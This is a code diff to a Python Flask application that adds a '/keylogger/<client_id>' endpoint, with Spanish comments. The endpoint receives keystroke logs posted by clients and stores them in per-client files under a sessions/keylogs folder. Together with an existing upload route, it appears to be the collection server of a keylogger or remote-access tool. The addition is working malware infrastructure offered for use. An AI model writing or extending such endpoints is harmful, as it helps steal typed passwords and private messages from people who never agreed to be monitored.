@@ -122,7 +122,33 @@ def upload():
         <input type="submit" value="Upload">
     </form>
     '''
+@app.route('/keylogger/<client_id>', methods=['POST'])
+def keylogger(client_id):
+    """
+    Recibe los logs del keylogger desde el cliente.
 
+    :param client_id: Identificador del cliente que envía los logs.
+    :return: Respuesta de éxito o error.
+    """
+    try:
+        log_data = request.form.get('log')
+        if log_data:
+            path = os.getcwd().replace("modules", "sessions")
+            keylog_dir = os.path.join(path, 'keylogs')
+            os.makedirs(keylog_dir, exist_ok=True)
+            log_file = os.path.join(keylog_dir, f'keylog_{client_id}.txt')
+            with open(log_file, 'a') as f:
+                f.write(log_data + '\n')
+            print(f"[INFO] Keylog recibido de {client_id}.")
+            return jsonify({"status": "success", "message": "Logs received"}), 200
+        else:
+            print(f"[ERROR] No se recibieron logs desde {client_id}.")
+            return jsonify({"status": "error", "message": "No logs received"}), 400
+
+    except Exception as e:
+        print(f"[ERROR] Error procesando logs de {client_id}: {str(e)}")
+        return jsonify({"status": "error", "message": "Internal server error"}), 500
+        
 def secure_filename(filename):
     """
     Sanitize the filename to prevent directory traversal and unauthorized access.
